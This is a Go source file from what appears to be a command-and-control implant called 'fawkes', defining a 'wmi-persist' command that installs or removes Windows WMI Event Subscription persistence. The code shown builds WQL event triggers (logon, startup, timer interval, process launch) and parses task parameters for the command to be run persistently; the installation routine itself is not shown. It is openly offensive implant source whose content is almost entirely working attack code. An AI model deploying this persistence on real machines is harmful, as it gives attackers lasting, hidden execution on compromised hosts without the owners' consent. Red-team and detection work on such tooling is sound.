package commands

import (
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"
)

type WmiPersistCommand struct{}

func (c *WmiPersistCommand) Name() string        { return "wmi-persist" }
func (c *WmiPersistCommand) Description() string { return "Install or remove WMI Event Subscription persistence" }

type wmiPersistArgs struct {
	Action      string `json:"action"`
	Name        string `json:"name"`
	Command     string `json:"command"`
	Trigger     string `json:"trigger"`
	IntervalSec int    `json:"interval_sec"`
	ProcessName string `json:"process_name"`
	Target      string `json:"target"`
}

// buildWQLTrigger returns the WQL event query for the given trigger type
func buildWQLTrigger(trigger string, intervalSec int, processName string) (string, error) {
	switch strings.ToLower(trigger) {
	case "logon":
		return "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'", nil
	case "startup":
		return "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120", nil
	case "interval":
		if intervalSec < 10 {
			intervalSec = 300
		}
		return "SELECT * FROM __TimerEvent WHERE TimerID = 'FawkesTimer' AND NumFirings > 0", nil
	case "process":
		if processName == "" {
			return "", fmt.Errorf("process_name required for process trigger")
		}
		return fmt.Sprintf("SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '%s'", processName), nil
	default:
		return "", fmt.Errorf("unknown trigger: %s (use: logon, startup, interval, process)", trigger)
	}
}

// parseWmiPersistArgs handles common parameter parsing and validation
func parseWmiPersistArgs(task structs.Task) (wmiPersistArgs, *structs.CommandResult) {
	if task.Params == "" {
		r := structs.CommandResult{
			Output: "Error: parameters required. Actions: install, remove, list",
			Status: "error", Completed: true,
		}
		return wmiPersistArgs{}, &r
	}

	var args wmiPersistArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		r := structs.CommandResult{
			Output: fmt.Sprintf("Error parsing parameters: %v", err),
			Status: "error", Completed: true,
		}
		return wmiPersistArgs{}, &r
	}

	return args, nil
}
